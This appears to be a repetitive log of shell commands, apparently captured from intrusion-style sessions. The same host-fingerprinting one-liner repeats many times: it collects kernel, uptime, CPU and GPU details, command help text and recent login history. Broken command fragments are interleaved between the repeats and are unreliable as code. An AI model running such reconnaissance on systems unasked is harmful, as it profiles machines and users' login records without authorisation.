awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo 